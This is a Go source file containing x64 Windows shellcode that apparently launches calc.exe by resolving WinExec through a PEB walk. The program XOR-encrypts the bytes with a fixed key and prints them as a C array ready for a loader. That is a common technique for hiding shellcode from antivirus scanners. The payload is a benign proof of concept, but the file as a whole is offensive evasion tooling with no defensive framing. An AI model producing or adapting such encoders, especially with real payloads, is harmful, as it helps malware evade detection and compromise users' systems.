package main

import "fmt"

func main() {
	// Original shellcode bytes
	shellcode := []byte{
		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
		0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
		0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
		0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
		0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
		0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
	}

	// XOR key
	key := []byte{0xDE, 0xAD, 0xC0, 0xDE}
	keyLen := len(key)

	// Create a slice to hold the encrypted shellcode.
	// Pre-allocating with make is efficient as we know the final size.
	encryptedShellcode := make([]byte, len(shellcode))

	// Perform XOR encryption
	for i := 0; i < len(shellcode); i++ {
		encryptedByte := shellcode[i] ^ key[i%keyLen]
		encryptedShellcode[i] = encryptedByte
	}

	// --- Print in C array format ---

	fmt.Println("unsigned char calc_shellcode[] = {")

	// Iterate through the encrypted shellcode for printing
	for i, b := range encryptedShellcode {
		// Add a newline every 15 bytes, but not at the very beginning
		if i%15 == 0 && i != 0 {
			fmt.Println() // Print a newline
		}
		// Print the byte in 0xXX format, followed by a comma and space
		fmt.Printf("0x%02X, ", b)
	}

	// Print the closing brace and a final newline
	fmt.Println("\n};")

}
